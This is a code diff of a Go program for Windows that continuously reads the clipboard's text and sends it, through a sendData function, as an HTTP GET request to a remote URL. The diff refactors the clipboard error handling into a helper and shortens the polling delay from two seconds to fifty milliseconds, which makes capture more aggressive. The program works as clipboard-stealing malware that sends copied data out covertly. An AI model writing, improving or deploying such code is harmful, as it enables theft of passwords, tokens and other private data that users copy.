@@ -37,20 +37,14 @@ func getClip() string {
 	if formatAvailable == 0 {
 	}
 	handle, _, _ := getClipboardData.Call(cfUnicodeText)
-	if handle == 0 {
-		closeClipboard.Call()
-	}
+	check(handle)
 
 	lock, _, _ := globalLock.Call(handle)
-	if lock == 0 {
-		closeClipboard.Call()
-	}
+	check(lock)
 	data := syscall.UTF16ToString((*[1 << 20]uint16)(unsafe.Pointer(lock))[:])
 
 	kek, _, _ := globalUnlock.Call(handle)
-	if kek == 0 {
-		closeClipboard.Call()
-	}
+	check(kek)
 	closeClipboard.Call()
 	return data
 }
@@ -65,6 +59,14 @@ func compare(a, b string) int {
 	return -1
 }
 
+func check(check uintptr) {
+	if check == 0 {
+		closeClipboard.Call()
+	} else {
+
+	}
+}
+
 func sendData(data string) {
 	req, err := http.NewRequest("GET", url+data, nil)
 	if err != nil {
@@ -76,7 +78,7 @@ func sendData(data string) {
 
 func main() {
 	for {
-		time.Sleep(time.Second * 2)
+		time.Sleep(time.Millisecond * 50)
 		closeClipboard.Call()
 		clippy, _, _ := openClipboard.Call(0)
 
@@ -91,6 +93,5 @@ func main() {
 			} else {
 			}
 		}
-
 	}
 }
